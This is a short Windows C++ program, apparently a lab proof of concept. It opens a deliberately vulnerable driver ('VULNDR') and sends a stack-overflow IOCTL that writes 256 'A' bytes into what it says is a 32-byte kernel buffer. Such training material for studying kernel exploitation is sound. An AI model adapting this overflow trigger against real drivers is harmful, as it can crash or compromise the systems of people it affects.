#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <string.h>

#include "public.h"

int wmain()
{
    wprintf(L"[+] Opening %ls\n", VULNDR_WIN32_NAME);

    HANDLE hDevice = CreateFileW(
        VULNDR_WIN32_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        wprintf(L"[-] CreateFileW failed. Error=%lu\n", GetLastError());
        return 1;
    }

    VULNDR_VULN_STACK_REQUEST request = { 0 };

    request.Size = 256;

    memset(
        request.Data,
        'A',
        sizeof(request.Data)
    );

    DWORD bytesReturned = 0;

    wprintf(L"[+] Sending vulnerable IOCTL\n");
    wprintf(L"[+] Request.Size = %lu\n", request.Size);
    wprintf(L"[+] Destination kernel stack buffer is only 32 bytes\n");

    BOOL ok = DeviceIoControl(
        hDevice,
        IOCTL_VULNDR_VULN_STACK_OVERFLOW,
        &request,
        sizeof(request),
        nullptr,
        0,
        &bytesReturned,
        nullptr
    );

    if (!ok)
    {
        wprintf(L"[-] DeviceIoControl failed. Error=%lu\n", GetLastError());
    }
    else
    {
        wprintf(L"[+] DeviceIoControl returned successfully\n");
    }

    CloseHandle(hDevice);

    return 0;
}